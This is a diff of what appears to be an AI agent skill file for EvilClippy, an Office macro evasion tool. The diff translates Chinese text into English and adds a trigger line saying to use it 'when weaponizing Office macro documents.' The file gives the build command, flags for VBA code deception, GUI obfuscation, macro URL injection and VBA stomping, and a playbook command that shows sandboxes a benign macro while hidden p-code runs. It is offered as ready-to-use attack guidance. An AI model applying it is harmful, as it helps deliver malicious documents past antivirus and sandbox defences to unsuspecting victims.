@@ -2,39 +2,42 @@
 name: evilclippy-macro-hide
 description: "EvilClippy: macro document evasion. Signals: malware development, evasion development, GUI obfuscation, remove macro VBA project, inject URL into macro."
 zh-signals: "EvilClippy: 宏文档免杀。信号:恶意软件开发,免杀开发,GUI 混淆,移除宏 VBA 项目,URL 注入宏。"
+when-to-use: >-
+  Use when weaponizing Office macro documents, to apply VBA stomping and GUI
+  obfuscation that evades static AV and sandbox inspection.
 ---
 
 # EvilClippy
 
-- 攻击大类:C45 免杀与载荷投递
-- 上游仓库:https://github.com/outflanknl/EvilClippy
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C45 AV Evasion and Payload Delivery
+- Upstream Repository: https://github.com/outflanknl/EvilClippy
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-git clone https://github.com/outflanknl/EvilClippy && 用 mono/xbuild 编译
+git clone https://github.com/outflanknl/EvilClippy && build with mono/xbuild
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `EvilClippy.exe -s fakecode.vba macro.doc` | VBA 代码欺骗(分析器看错代码) |
-| `-g` | GUI 混淆 |
-| `-r` | 移除宏 VBA 项目 |
-| `-u` | URL 注入宏 |
+| `EvilClippy.exe -s fakecode.vba macro.doc` | VBA code deception (analyzers see the wrong code) |
+| `-g` | GUI obfuscation |
+| `-r` | Remove the macro VBA project |
+| `-u` | Inject a URL into the macro |
 | `-st` | VBA stomping |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 宏文档免杀
+### Macro Document AV Evasion
 
 ```bash
 EvilClippy.exe -s benign.vba payload.docm
-# 预览/沙箱看到 benign 宏,实际执行 stomped p-code
+# Preview/sandbox sees the benign macro while the stomped p-code actually executes
 ```
 
-## 注意事项
+## Notes
 
-Outflank 出品,Office 宏武器化: VBA stomping(源码与 p-code 分离)+GUI 伪装,绕过多数杀软静态查杀。
+From Outflank, weaponizing Office macros: VBA stomping (separating source from p-code) plus GUI camouflage bypasses static AV detection in most products.
